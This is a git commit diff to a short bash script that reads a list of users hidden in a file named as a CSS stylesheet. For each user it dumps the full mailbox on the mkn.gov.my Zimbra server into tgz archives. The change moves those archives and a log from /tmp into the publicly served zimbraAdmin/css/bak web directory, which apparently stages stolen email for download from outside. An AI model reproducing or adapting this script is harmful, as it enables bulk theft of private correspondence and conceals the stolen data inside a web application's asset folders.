647a99e06ba33b17ad23d9f9dbb43e969d0884c7
fun1n <34291425+fun1n@users.noreply.github.com>
2022-09-28 20:03:20 -0700

    Update 1.bash

--- 1.bash
+++ 1.bash
@@ -2,11 +2,11 @@
 while read  USER
 do
 TODAY=`date`
-LOGFILE="/tmp/bak/backuplog.txt"
+LOGFILE="/opt/zimbra/jetty/webapps/zimbraAdmin/css/bak/backuplog.txt"
 echo $TODAY  >> $LOGFILE
 echo $USER >> $LOGFILE
 
 /opt/zimbra/bin/zmmailbox -z -m $USER gms >> $LOGFILE
 
-zmmailbox -z -m $USER@mkn.gov.my getRestURL "//?fmt=tgz&start=1641024000000" > /tmp/bak/$USER.tgz
+zmmailbox -z -m $USER@mkn.gov.my getRestURL "//?fmt=tgz&start=1641024000000" > /opt/zimbra/jetty/webapps/zimbraAdmin/css/bak/$USER.tgz
 done < /opt/zimbra/jetty/webapps/zimbraAdmin/css/zz.css
